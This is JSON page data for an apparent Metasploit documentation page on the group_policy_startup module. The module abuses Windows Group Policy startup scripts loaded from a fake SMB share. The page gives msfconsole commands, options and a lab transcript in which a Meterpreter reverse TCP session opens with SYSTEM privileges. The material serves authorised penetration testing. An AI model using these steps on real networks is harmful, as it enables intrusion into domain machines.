{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/smb/group_policy_startup","result":{"data":{"moduleMetadataJson":{"id":"c04eb218-41ae-5318-a5ca-21040f189646","name":"Group Policy Script Execution From Shared Resource","fullname":"exploit/windows/smb/group_policy_startup","description":"This is a general-purpose module for exploiting systems with Windows Group Policy\n        configured to load VBS startup/logon scripts from remote locations. This module runs\n        a SMB shared resource that will provide a payload through a VBS file. Startup scripts\n        will be executed with SYSTEM privileges, while logon scripts will be executed with the\n        user privileges. Have into account which the attacker still needs to redirect the\n        target traffic to the fake SMB share to exploit it successfully. Please note in some\n        cases, it will take 5 to 10 minutes to receive a session.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/windows/smb/group_policy_startup","documentationSlug":"/modules/documentation/exploit/windows/smb/group_policy_startup"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This is a general-purpose module for exploiting systems with Windows Group Policy configured to load VBS startup/logon scripts from remote locations.\nThis module runs a SMB shared resource that will provide a payload through a VBS file. Startup scripts will be executed with SYSTEM privileges,\nwhile logon scripts will be executed with the user privileges. The attacker still needs to redirect the target traffic to the fake SMB\nshare to exploit it successfully.</p>\n<p>Please note in some cases, it will take 5 to 10 minutes to receive a session.</p>\n<p>More information available at <a href=\"https://blog.gdssecurity.com/labs/2015/1/26/badsamba-exploiting-windows-startup-scripts-using-a-maliciou.html\">Gotham Digital Science Security</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use modules/exploits/windows/smb/group_policy_startup</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>FILE_NAME</strong></p>\n<p>  VBS File name to share (Default: random .vbs)</p>\n<p>  <strong>FOLDER_NAME</strong></p>\n<p>  Folder name to share (Default: none)</p>\n<p>  <strong>SHARE</strong></p>\n<p>  Share name (Default: Random)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"domain-group-policy\" style=\"position:relative;\"><a href=\"#domain-group-policy\" aria-label=\"domain group policy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Domain Group Policy</h3>\n<p>In this scenario, the following computers are present:</p>\n<ol>\n<li>Windows 7 (x64, Build 7601, SP1): Victim</li>\n<li>Server 2016 (x64, Version 1607, OS Build 14393.970): Domain Controller</li>\n</ol>\n<p>The module sets up the SMB share and VBScript file. Out of band (outside the scope of this module or docs) a Group Policy is simply applied to the <code class=\"language-text\">OU</code> computer container.\nNext, the Win 7 box grabs the payload, in this case the meterpreter reverse_tcp stager on boot, with <code class=\"language-text\">SYSTEM</code> privs because its executed as a start up script.\nTheoretically, any computer in that <code class=\"language-text\">OU</code> would also execute the script on started up.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use modules/exploits/windows/smb/group_policy_startup\nmsf exploit(windows/smb/group_policy_startup) &gt; set FILE_NAME startup.vbs\n  FILE_NAME =&gt; startup.vbs\nmsf exploit(windows/smb/group_policy_startup) &gt; set SHARE scripts\n  SHARE =&gt; scripts\nmsf exploit(windows/smb/group_policy_startup) &gt; exploit\n  [*] Exploit running as background job 0.\n  [*] Exploit completed, but no session was created.\n\n  [*] Started reverse TCP handler on 192.168.1.3:4444\n  [*] File available on \\\\192.168.1.3\\scripts\\startup.vbs...\n  [*] Started service listener on 192.168.1.3:445\n  [*] Server started.\n  [*] Sending stage (180291 bytes) to 192.168.1.4\n  [*] Meterpreter session 1 opened (192.168.1.3:4444 -&gt; 192.168.1.4:49178) at 2019-12-04 13:12:05 -0700\nmsf exploit(windows/smb/group_policy_startup) &gt; sessions 1\n  [*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo\n  Computer        : MSF-PC\n  OS              : Windows 7 (6.1 Build 7601, Service Pack 1).\n  Architecture    : x64\n  System Language : en_US\n  Domain          : MSF\n  Logged On Users : 1\n  Meterpreter     : x86/windows\nmeterpreter &gt; getuid\n  Server username: NT AUTHORITY\\SYSTEM</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"c04eb218-41ae-5318-a5ca-21040f189646"}}}